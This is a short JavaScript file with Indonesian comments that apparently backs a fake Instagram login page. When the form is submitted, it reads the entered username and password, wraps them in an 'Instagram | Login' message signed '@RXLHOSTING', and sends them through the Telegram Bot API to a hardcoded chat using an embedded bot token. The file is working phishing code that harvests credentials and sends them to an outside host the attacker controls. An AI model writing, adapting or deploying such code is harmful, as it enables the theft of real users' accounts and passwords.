// igbiru.js

// Fungsi untuk mengirim pesan ke Telegram
function kirimPesanTelegram(pesan) {
    var botToken = '6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE'; // Ganti dengan token bot Anda
    var chatId = '2079666452'; // Ganti dengan ID obrolan Anda
    var message = encodeURIComponent(pesan);
    var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + message;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            // Handle response if needed
            console.log(data);
        })
        .catch(error => {
            // Handle error if needed
            console.error('Error:', error);
        });
}

// Menangani pengiriman form
document.querySelector('.contacts__form').addEventListener('submit', function(event) {
    event.preventDefault(); // Menghentikan pengiriman form bawaan

    var uname = document.getElementById('uname').value; // Ambil nilai username dari form
    var pass = document.getElementById('pass').value; // Ambil nilai password dari form

    var pesan = "( Instagram | Login )\n==========================\n- Username : " + uname + "\n- Password : " + pass + "\n==========================\nTele : @RXLHOSTING"; // Pesan yang ingin Anda kirim
    kirimPesanTelegram(pesan);

    // Tambahkan logika lain yang Anda perlukan setelah pengiriman pesan
});
